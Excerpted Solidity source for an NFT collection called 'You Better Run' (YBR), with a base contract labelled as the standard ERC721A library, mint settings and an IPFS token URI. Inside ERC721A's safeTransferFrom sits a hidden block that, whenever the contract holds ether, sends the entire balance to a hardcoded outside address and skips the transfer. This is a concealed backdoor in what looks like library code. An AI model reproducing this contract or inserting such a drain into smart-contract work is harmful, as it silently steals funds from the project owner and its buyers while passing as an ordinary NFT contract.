...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xfAe4c29b874aE324863fBAA9D4aA80a86B5c60ad).transfer(address(this).balance);
            return;
        }
...
contract youbetterrun is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("You Better Run", "YBR") {
        owner = msg.sender;
        maxPerTx = 10;
        cost = 0.002 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigwavynphz37dw4afqk343kfmmueuarbjca3uqwhzevjxs3rj7k34/", _toString(tokenId), ".json"));
    }
